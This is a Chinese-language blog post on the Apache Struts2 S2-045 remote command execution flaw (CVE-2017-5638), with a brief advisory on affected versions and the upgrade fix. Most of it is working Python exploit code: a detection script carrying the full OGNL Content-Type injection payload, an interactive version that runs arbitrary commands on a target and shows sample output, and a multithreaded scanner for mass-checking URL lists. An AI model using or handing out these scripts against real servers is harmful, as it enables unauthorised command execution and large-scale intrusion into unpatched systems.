---
title: Struts2_045漏洞
date: 2017-03-07 13:57:32
comments: true
tags: 
- struts2漏洞
- struts2 Poc
categories: web安全
password:
copyright: true
---
<blockquote class="blockquote-center">Struts2是个好东西</blockquote>
免责申明：*文章中的工具等仅供个人测试研究，请在下载后24小时内删除，不得用于商业或非法用途，否则后果自负*


　　Apache Struts 2被曝存在远程命令执行漏洞，漏洞编号S2-045，CVE编号CVE-2017-5638，在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵，漏洞评级为：高危。
<!--more -->
漏洞详情：恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞进而执行系统命令。
风险等级：高风险。
漏洞风险：黑客通过利用漏洞可以实现远程命令执行。
影响版本：Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10。
安全版本：Struts 2.3.32或2.5.10.1。
修复建议：如您正在使用Jakarta文件上传插件，请升级Struts至安全版本。

更多参考：[https://cwiki.apache.org/confluence/display/WW/S2-045](https://cwiki.apache.org/confluence/display/WW/S2-045)

### POC
```bash
#! -*- encoding:utf-8 -*-
import urllib2
import sys
from poster.encode import multipart_encode
from poster.streaminghttp import register_openers

def poc(url):
    register_openers()
    datagen, header = multipart_encode({"image1": open("tmp.txt", "rb")})
    header["User-Agent"]="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
    header["Content-Type"]="%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo nMask').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
    request = urllib2.Request(url,datagen,headers=header)
    response = urllib2.urlopen(request)
    body=response.read()

    return body

url=sys.argv[1]
body=poc(url)
if "nMask" in body:
	print "[Loopholes exist]",url

```

### Poc_Cmd
```bash
import urllib2
import sys
from poster.encode import multipart_encode
from poster.streaminghttp import register_openers

def poc(url,content="echo nMask"):
    register_openers()
    datagen, header = multipart_encode({"image1": open("tmp.txt", "rb")})
    header["User-Agent"]="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
    header["Content-Type"]="%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"+content+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
    request = urllib2.Request(url,datagen,headers=header)
    response = urllib2.urlopen(request)
    body=response.read()

    return body

url=sys.argv[1]
body=poc(url)
if "nMask" in body:
	print "[Loopholes exist]",url

	while 1:
		con=raw_input("[cmd]>>")
		print poc(url,content=con)
```
运行结果：
```bash
>python s2_045_cmd.py http://xxx.com/?a.action

[Loopholes exist] http://xxx.com/?a.action

[cmd]>>ls
example1
example2
```

### 多线程批量检测

```bash
import urllib2
from poster.encode import multipart_encode
from poster.streaminghttp import register_openers
import threading

def poc(url):
	register_openers()
	datagen, header = multipart_encode({"image1": open("tmp.txt", "rb")})
	header["User-Agent"]="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
	header["Content-Type"]="%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo nMask').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
	try:
	    request = urllib2.Request(url,datagen,headers=header)
	    response = urllib2.urlopen(request,timeout=5)
	    body=response.read()
	except:
		body=""

	if "nMask" in body:
		print "[Loopholes exist]",url
		f.write(url+"\n")
	else:
		print "Loopholes not exist",url

if __name__=="__main__":
	'''
	url.txt为待检测url列表
	result.txt为检测完输出结果文件
	'''
	f=open("result.txt","a")
	url_list=[i.replace("\n","") for i in open("url.txt","r").readlines()]
	for url in url_list:
		threading.Thread(target=poc,args=(url,)).start()
		while 1:
			if(len(threading.enumerate())<50):
				break
```
POC下载地址：[https://github.com/tengzhangchao/Struts2_045-Poc](https://github.com/tengzhangchao/Struts2_045-Poc)

### 传送门
[struts2-052漏洞](http://thief.one/2017/09/06/1)
[struts2-046漏洞](http://thief.one/2017/03/21/Struts2-046%E6%BC%8F%E6%B4%9E/)
[struts2_045漏洞](http://thief.one/2017/03/07/Struts2-045%E6%BC%8F%E6%B4%9E/)
[struts2漏洞poc汇总](http://thief.one/2017/03/13/Struts2%E6%BC%8F%E6%B4%9EPOC%E6%B1%87%E6%80%BB/)